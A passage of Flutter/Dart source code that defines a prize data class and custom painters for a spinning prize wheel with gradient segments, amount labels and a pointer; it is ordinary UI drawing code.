                    ),
                  ),
                ],
              ),
            ),
          );
        },
      ),
    );
  }
}

class SpinPrize {
  final double amount;
  final Color color;
  final String label;
  final String emoji;

  SpinPrize({
    required this.amount,
    required this.color,
    required this.label,
    required this.emoji,
  });
}

class ModernWheelPainter extends CustomPainter {
  final List<SpinPrize> prizes;

  ModernWheelPainter(this.prizes);

  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    final radius = size.width / 2 - 10;
    
    double startAngle = -pi / 2;
    final sweepAngle = 2 * pi / prizes.length;
    
    for (int i = 0; i < prizes.length; i++) {
      // Create gradient for each segment
      final segmentPaint = Paint()
        ..shader = LinearGradient(
          colors: [
            prizes[i].color.withOpacity(0.9),
            prizes[i].color.withOpacity(0.7),
          ],
          begin: Alignment.centerLeft,
          end: Alignment.centerRight,
        ).createShader(Rect.fromCircle(center: center, radius: radius))
        ..style = PaintingStyle.fill;
      
      canvas.drawArc(
        Rect.fromCircle(center: center, radius: radius),
        startAngle,
        sweepAngle,
        true,
        segmentPaint,
      );
      
      // Segment border
      final borderPaint = Paint()
        ..color = Colors.white.withOpacity(0.2)
        ..style = PaintingStyle.stroke
        ..strokeWidth = 1;
      
      canvas.drawArc(
        Rect.fromCircle(center: center, radius: radius),
        startAngle,
        sweepAngle,
        true,
        borderPaint,
      );
      
      // Draw text
      final textAngle = startAngle + sweepAngle / 2;
      final textRadius = radius * 0.7;
      
      final textPainter = TextPainter(
        text: TextSpan(
          text: '${prizes[i].amount}',
          style: TextStyle(
            color: Colors.white,
            fontSize: 20,
            fontWeight: FontWeight.bold,
            shadows: [
              Shadow(
                color: Colors.black.withOpacity(0.8),
                blurRadius: 3,
                offset: Offset(1, 1),
              ),
            ],
          ),
        ),
        textDirection: TextDirection.ltr,
      );
      textPainter.layout();
      
      final textX = center.dx + cos(textAngle) * textRadius - textPainter.width / 2;
      final textY = center.dy + sin(textAngle) * textRadius - textPainter.height / 2;
      
      textPainter.paint(canvas, Offset(textX, textY));
      
      startAngle += sweepAngle;
    }
    
    // Inner circle
    final innerPaint = Paint()
      ..shader = RadialGradient(
        colors: [
          Color(0xFF1A0B3D),
          Color(0xFF0F172A),
        ],
      ).createShader(Rect.fromCircle(center: center, radius: 50))
      ..style = PaintingStyle.fill;
    
    canvas.drawCircle(center, 50, innerPaint);
    
    final innerBorderPaint = Paint()
      ..color = Color(0xFF14F195).withOpacity(0.5)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 2;
    
    canvas.drawCircle(center, 50, innerBorderPaint);
  }

  @override
  bool shouldRepaint(CustomPainter oldDelegate) => false;
}

class PointerPainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final center = Offset(size.width / 2, size.height / 2);
    
    // Main pointer
    final pointerPaint = Paint()
      ..shader = LinearGradient(
        colors: [Color(0xFF14F195), Color(0xFFF59E0B)],
        begin: Alignment.topCenter,
        end: Alignment.bottomCenter,
      ).createShader(Rect.fromLTWH(0, 0, size.width, size.height))
      ..style = PaintingStyle.fill;
    
    final path = Path();
    path.moveTo(center.dx, center.dy);
    path.lineTo(center.dx - 12, center.dy + 25);
    path.lineTo(center.dx + 12, center.dy + 25);
    path.close();
    
    // Shadow
    final shadowPaint = Paint()
      ..color = Colors.black.withOpacity(0.3)
      ..maskFilter = MaskFilter.blur(BlurStyle.normal, 3);
    
    canvas.drawPath(path.shift(Offset(2, 2)), shadowPaint);
    canvas.drawPath(path, pointerPaint);
    
    // Border
    final borderPaint = Paint()
      ..color = Colors.white.withOpacity(0.8)
      ..style = PaintingStyle.stroke
      ..strokeWidth = 1.5;
    
    canvas.drawPath(path, borderPaint);
  }

  @override
  bool shouldRepaint(CustomPainter oldDelegate) => false;
}